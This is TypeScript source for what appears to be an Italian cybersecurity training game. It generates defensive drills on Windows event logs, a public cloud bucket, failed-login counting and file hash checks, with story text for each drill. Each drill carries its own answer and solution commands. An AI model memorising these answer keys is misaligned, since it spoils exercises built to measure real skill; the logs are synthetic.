const G12: Gen[] = [
  {
    id: 'eventi-win',
    dirName: 'windows',
    make: (c) => {
      const { r, lv } = c;
      const L = ['# ora,EventID,computer,utente,dettaglio'];
      let t = 600;
      const ev = (id: number, host: string, u: string, d: string) => {
        t += r.int(1, 9);
        L.push(`2077-11-12 ${time(t * 60).slice(0, 5)},${id},${host},${u},${d}`);
      };
      const hosts = r.shuffle(['PC-01', 'PC-02', 'PC-07', 'PC-12', 'WS-03', 'WS-21']).slice(0, 2 + lv);
      let fails = 0;
      for (let i = 0; i < 3 + lv * 3; i++) {
        if (r.next() < 0.5) {
          ev(4625, 'DC01', r.pick(NAMES), 'accesso non riuscito');
          fails++;
        } else ev(4624, r.pick(hosts), r.pick(NAMES), 'accesso riuscito');
      }
      const newUser = `${r.pick(['svc', 'helpdesk', 'backup', 'admin'])}_${r.int(2, 99)}`;
      const wiped = r.pick(hosts);
      ev(4720, 'DC01', r.pick(NAMES), `creato account utente: ${newUser}`);
      ev(4728, 'DC01', r.pick(NAMES), `aggiunto ${newUser} al gruppo Domain Admins`);
      ev(1102, wiped, r.pick(NAMES), 'il registro di controllo è stato cancellato');
      write(c, 'security.csv', L.join('\n') + '\n');
      const f = `${c.dir}/security.csv`;
      const v = r.int(0, 2);
      if (v === 0)
        return { title: 'Accessi falliti', prompt: `Quanti eventi **4625** ci sono in \`${f}\`?`, hints: ['Cerca l\'Event ID tra virgole.', `grep -c ",4625," ${f}`], answer: [String(fails)], solve: [`grep -c ",4625," ${f}`] };
      if (v === 1)
        return { title: 'Il nuovo amministratore', prompt: `In \`${f}\` è stato creato un account poi aggiunto ai Domain Admins. Come si chiama?`, hints: ['Event ID 4720.', `grep ",4720," ${f}`], answer: [newUser], solve: [`grep ",4720," ${f}`] };
      return { title: 'Tracce cancellate', prompt: `Su quale computer è stato cancellato il registro di sicurezza, secondo \`${f}\`?`, hints: ['Event ID 1102.', `grep ",1102," ${f}`], answer: [wiped], solve: [`grep ",1102," ${f} | cut -d "," -f 3`] };
    },
  },
];

// ---------------------------------------------------------------- capitolo 13: cloud

const G13: Gen[] = [
  {
    id: 'bucket',
    dirName: 'cloud',
    make: (c) => {
      const { r, lv } = c;
      const names = r.shuffle(['foto', 'backup', 'fatture', 'log', 'sito', 'export', 'clienti', 'archivio']).slice(0, 3 + lv).map((n) => `${r.pick(WORDS)}-${n}-${r.int(10, 99)}`);
      const pub = r.pick(names);
      const lines = names.map(
        (n) => `  { "Bucket": "${n}", "Statement": [{ "Effect": "Allow", "Principal": ${n === pub ? '"*"' : `{"AWS": "arn:aws:iam::2077:role/${r.pick(['sito', 'backup', 'app'])}"}`}, "Action": "s3:GetObject" }] }`,
      );
      write(c, 'storage.json', '[\n' + lines.join(',\n') + '\n]\n');
      return {
        title: 'Lo storage aperto',
        prompt: `In \`${c.dir}/storage.json\`, quale bucket è leggibile da **chiunque**?`,
        hints: ['"Principal": "*" vuol dire tutti.', `grep '"*"' ${c.dir}/storage.json`],
        answer: [pub],
        solve: [`grep '"*"' ${c.dir}/storage.json`],
      };
    },
  },
];

/**
 * Il "perché" di ogni sfida: chi te la chiede e cosa è successo.
 * Più varianti per generatore, così la stessa sfida non si presenta sempre uguale.
 */
export const STORIES: Record<string, string[]> = {
  'py-conta': [
    `@nyx: Il SOC ti passa un'esportazione degli accessi della notte. Domani te ne passeranno un'altra, e dopodomani un'altra ancora: scrivi lo script una volta e riusalo.`,
    `@rook: Un cliente vuole sapere chi ha fallito più accessi stanotte. Non contare a mano: fallo fare a Python.`,
  ],
  'py-impronte': [
    `@rook: Il fornitore di un cliente ha pubblicato le impronte dei suoi aggiornamenti. Uno dei file che ci hanno mandato non torna. Quale?`,
    `@nyx: Controllo di integrità prima dell'installazione. Con Python lo fai su tre file come su tremila.`,
  ],
  'flag-nascosta': [
    `@nyx: Riscaldamento. Ho nascosto una cosa nel tuo deck come farebbe chi non vuole farsi trovare. Un analista guarda anche dove gli altri non guardano.`,
    `@rook: Un cliente ha ereditato il portatile di un ex socio e giura che "non c'è niente". Io non mi fido delle cartelle che sembrano vuote. Tu?`,
  ],
  'conta-file': [
    `@rook: Il ripperdoc di Kabuki chiude l'ambulatorio e deve consegnare l'archivio al nuovo proprietario. Vuole un inventario preciso prima di firmare.`,
    `@nyx: Prima di toccare un sistema si fa l'inventario: cosa c'è e quanto. Se non sai cosa avevi, non saprai mai cosa ti manca dopo un incidente.`,
  ],
  crea: [
    `@rook: Nuovo contratto in arrivo. Ogni lavoro parte con una cartella ordinata: tra sei mesi, quando l'avvocato del cliente ti chiederà una prova, dovrai trovarla in dieci secondi.`,
    `@nyx: Le prove sparse nella home sono prove perse. Prepara la struttura del caso come ti ho insegnato.`,
  ],
  porta: [
    `@rook: Il Lizzie's ha fatto installare un sistema nuovo da un "cugino esperto". La proprietaria vuole sapere cosa ha lasciato acceso. Contratto firmato, la rete è in perimetro.`,
    `@nyx: Ogni porta aperta è una porta che qualcuno prima o poi proverà. Il cliente ci paga per trovarla prima degli altri.`,
  ],
  'host-attivi': [
    `@rook: Il cliente dice di avere "quattro o cinque macchine". Dicono tutti così. Contale tu: non si protegge quello che non si sa di avere.`,
    `@nyx: Primo giorno di un audit autorizzato: si fa il censimento della rete. I dispositivi dimenticati sono quelli che nessuno aggiorna.`,
  ],
  permessi: [
    `@rook: Un dipendente del cliente ha letto le buste paga dei colleghi senza forzare nulla: il file era semplicemente aperto a tutti. Trovami quale.`,
    `@nyx: Metà degli "attacchi" che vedrai non sono attacchi: sono permessi sbagliati. Controlla questa cartella prima che lo faccia qualcun altro.`,
  ],
  chiudi: [
    `@nyx: Abbiamo trovato il file troppo aperto. Trovare un problema senza chiuderlo è lavoro a metà: sistemalo.`,
    `@rook: L'audit del cliente è domani mattina. Quel file deve poterlo leggere solo il suo proprietario, e deve essere così stanotte.`,
  ],
  uid: [
    `@nyx: Controllo di routine sugli account di un server. Cerca quello che non torna: un utente con poteri che non dovrebbe avere è la firma classica di chi è già entrato.`,
    `@rook: Il vecchio amministratore del cliente è stato licenziato in malo modo. Voglio sapere se ha lasciato un account di scorta.`,
  ],
  bruteforce: [
    `@rook: Mama Welles mi ha chiamato alle tre di notte: il server del bar è lento e il log degli accessi è esploso. Dimmi cosa sta succedendo.`,
    `@nyx: Turno al SOC. È scattato un allarme per troppi accessi falliti. Prima di svegliare qualcuno, guarda il log e porta i numeri.`,
  ],
  'conta-parola': [
    `@nyx: Un collega ti passa un file enorme e una domanda semplice. Non si conta a mano: si fa contare la macchina.`,
    `@rook: Il cliente vuole un numero nel report, non un "tanti". Dammi il conteggio esatto.`,
  ],
  script: [
    `@nyx: Questo controllo lo rifarai ogni settimana. La terza volta che ripeti un comando a mano, scrivi uno script.`,
    `@rook: Il tecnico del cliente non sa usare il terminale. Lasciagli uno script che faccia il lavoro con un solo comando.`,
  ],
  base64: [
    `@nyx: In un file di configurazione sequestrato c'è una riga che sembra rumore. Non è cifrata: è solo travestita. Leggila.`,
    `@rook: Un cliente ha trovato questa stringa in una mail sospetta e pensa sia "un codice segreto". Digli cosa c'è scritto davvero.`,
  ],
  integrita: [
    `@rook: Al cliente è arrivato un "aggiornamento urgente" da un fornitore, con tanto di impronta ufficiale sul sito. Prima di installarlo, verifica che sia quello vero.`,
    `@nyx: Regola del mestiere: un file scaricato non è fidato finché l'impronta non coincide. Controlla questi.`,
  ],
  'web-log': [
    `@rook: Il negozio online di un cliente ha avuto una notte agitata. Ho il log del server web: dimmi chi ha fatto cosa.`,
    `@nyx: Il sito è su, ma qualcuno ci ha frugato. Il log degli accessi racconta tutto, se sai leggerlo.`,
  ],
  spraying: [
    `@nyx: Turno al SOC di Arasaka Logistics. Nessun account è stato bloccato, eppure qualcosa non torna: pochi tentativi, ma su tanti utenti. Indaga.`,
    `@rook: Il cliente dice che "le password sbagliate capitano". Vero. Ma non a venti dipendenti nello stesso minuto.`,
  ],
  beacon: [
    `@nyx: Un computer dell'ufficio contabilità parla con l'esterno a intervalli troppo regolari. Le persone non sono così puntuali: il malware sì.`,
    `@rook: L'antivirus del cliente dice che è tutto pulito. Il traffico di rete dice altro. Trovami la macchina.`,
  ],
  subnet: [
    `@rook: Il cliente apre una sede nuova e mi chiede quanti dispositivi può collegare su quella rete. Fai il conto prima che compri gli switch.`,
    `@nyx: Prima di una scansione devi sapere quanto è grande la rete. Sbagliare la maschera vuol dire uscire dal perimetro.`,
  ],
  scope: [
    `@nyx: Fermo. Prima di lanciare qualsiasi cosa, controlla il contratto: quell'indirizzo è nel perimetro autorizzato o no? Fuori dal perimetro è reato, anche per sbaglio.`,
    `@rook: Il cliente mi ha dato un elenco di indirizzi "più o meno". Io non lavoro con i più o meno. Verifica.`,
  ],
  spf: [
    `@rook: A un cliente è arrivata una fattura falsa che sembrava spedita dal suo stesso dominio. Controlla se il dominio è protetto dalla falsificazione.`,
    `@nyx: Il phishing parte spesso da un dominio configurato male. Guarda i record pubblici: è tutto consultabile senza toccare i loro server.`,
  ],
  crtsh: [
    `@nyx: Fonti aperte. I certificati sono pubblici, e raccontano quali sottodomini esistono, compresi quelli che l'azienda ha dimenticato di avere.`,
    `@rook: Il cliente giura di avere solo il sito principale. Controlla nei registri pubblici se è vero.`,
  ],
  suid: [
    `@nyx: Controllo di hardening su un server prima che vada in produzione. Cerca un programma con un privilegio che non dovrebbe avere.`,
    `@rook: Un tecnico del cliente "ha sistemato i permessi per far funzionare tutto". Trovami cosa ha lasciato aperto.`,
  ],
  segreto: [
    `@rook: Il cliente sta per pubblicare il codice del suo sito. Prima che lo faccia, controlla che dentro non ci sia rimasta una password.`,
    `@nyx: Le credenziali dimenticate nei file sono tra le cause più comuni di violazione. Cercale tu prima che le trovi un altro.`,
  ],
  'eventi-win': [
    `@nyx: Stanotte tocca ai PC Windows dell'ufficio. Ho esportato il registro di sicurezza: gli Event ID raccontano la storia.`,
    `@rook: La segretaria del cliente dice che il suo computer "si è comportato in modo strano" ieri. Guarda il registro degli eventi.`,
  ],
  bucket: [
    `@rook: Un giornalista ha scritto al cliente dicendo di aver trovato i loro documenti online. Controlla le regole dello storage in cloud.`,
    `@nyx: Nel cloud l'errore più comune non è un attacco: è una casella spuntata male. Trova lo storage aperto al mondo.`,
  ],
};

// ---------------------------------------------------------------- capitolo PY: Python

const GPY: Gen[] = [
  {
    id: 'py-conta',
    dirName: 'pylog',
    make: (c) => {
      const { r, lv } = c;
      const ips = Array.from({ length: 3 + lv * 2 }, () => pubIp(r));
      const top = ips[0];
      const lines: string[] = [];
      let t = r.int(3600, 7000);
      const counts = new Map<string, number>();
      // l'IP "top" ha sempre più KO di tutti gli altri
      for (const ip of ips) counts.set(ip, ip === top ? 9 + lv * 3 : r.int(1, 6 + lv));
      for (const [ip, n] of counts) for (let i = 0; i < n; i++) lines.push(`${ip} KO`);
      for (let i = 0; i < 10 + lv * 6; i++) lines.push(`${r.pick(ips)} OK`);
      const shuffled = r.shuffle(lines).map((l) => `${time((t += r.int(1, 40)))} ${l.split(' ')[0]} esito=${l.split(' ')[1]}`);
      write(c, 'accessi.txt', shuffled.join('\n') + '\n');
      const field = lv === 1 ? 'il secondo campo è l\'IP' : 'l\'IP è uno dei campi: trovalo';
      return {
        title: 'Lo script del turno',
        prompt: `Scrivi uno script Python (o usa \`python3 -c\`) che legge \`${c.dir}/accessi.txt\` e stampa l'IP con più righe \`esito=KO\` (${field}).`,
        hints: ['Counter dal modulo collections, un for sulle righe, un if "esito=KO" in riga.', `python3 -c "from collections import Counter; c = Counter(r.split()[1] for r in open('${c.dir}/accessi.txt') if 'esito=KO' in r); print(c.most_common(1))"`],
        check: (ev) => ev.type === 'python' && ev.ok && ev.out.some((l) => l.includes(top)) && ev.src.includes('accessi.txt'),
        solve: [`python3 -c "from collections import Counter; c = Counter(r.split()[1] for r in open('${c.dir}/accessi.txt') if 'esito=KO' in r); print(c.most_common(1))"`],
      };
    },
  },
  {
    id: 'py-impronte',
    dirName: 'pyhash',
    make: (c) => {
      const { r, lv } = c;
      const files = r.shuffle(['kernel.img', 'driver.bin', 'config.ini', 'boot.cfg', 'agent.bin', 'update.pkg', 'modem.fw']).slice(0, 3 + lv);
      const bad = r.pick(files);
      const man: string[] = [];
      for (const f of files) {
        const body = `${f} build ${r.hex(8)}\n`;
        write(c, `file/${f}`, f === bad ? body + `${r.hex(6)}\n` : body);
        man.push(`${sha256(body)}  ${f}`);
      }
      write(c, 'impronte.txt', man.join('\n') + '\n');
      return {
        title: 'L\'impronta che non torna',
        prompt: `In \`${c.dir}/file/\` ci sono ${files.length} file e in \`${c.dir}/impronte.txt\` le loro impronte ufficiali. Con Python (\`hashlib\`) trova il file alterato e invia il suo nome con \`flag\`.`,
        hints: ['Per ogni riga di impronte.txt: atteso, nome = riga.split(); apri il file in "rb" e confronta hashlib.sha256(...).hexdigest().', `Oppure, per verificare: sha256sum ${c.dir}/file/* e confronta.`],
        answer: [bad],
        solve: [`sha256sum ${c.dir}/file/*`, `flag ${bad}`],
      };
    },
  },
];

export const GENERATORS: Record<string, Gen[]> = {
  ch01: G01,
  ch02: G02,
  ch03: G03,
  ch04: G04,
  ch05: G05,
  ch06: G06,
  ch07: G07,
  ch08: G08,
  ch09: G09,
  ch10: G10,
  ch11: G11,
  ch12: G12,
  ch13: G13,
  chPY: GPY,
};

export const LEVELS: Record<Level, { name: string; count: number; hints: 'free' | 'cost' | 'none'; xp: number }> = {
  1: { name: 'Facile', count: 4, hints: 'free', xp: 10 },
  2: { name: 'Medio', count: 6, hints: 'cost', xp: 20 },
  3: { name: 'Difficile', count: 8, hints: 'none', xp: 30 },
};

/** Genera una sessione di sfide per i capitoli scelti, scrivendo i dati nel deck. */
export function generateSession(sh: Shell, chapters: string[], level: Level, seed: number): Drill[] {
  const r = makeRng(seed);
  const pool = chapters.flatMap((ch) => (GENERATORS[ch] ?? []).map((g) => ({ ch, g })));
  if (!pool.length) return [];
  const order: { ch: string; g: Gen }[] = [];
  while (order.length < LEVELS[level].count) order.push(...r.shuffle(pool));
  return order.slice(0, LEVELS[level].count).map(({ ch, g }, i) => {
    const ctx: Ctx = { sh, r, lv: level, dir: `sim/${i + 1}-${g.dirName}` };
    const tales = STORIES[g.id] ?? [];
    const story = tales.length ? tales[Math.abs(seed + i * 7) % tales.length] : undefined;
    return { chapter: ch, story, ...g.make(ctx) };
  });
}

export function normalizeDrillAnswer(s: string): string {
  return s.trim().toLowerCase().replace(/\s+/g, ' ');
}
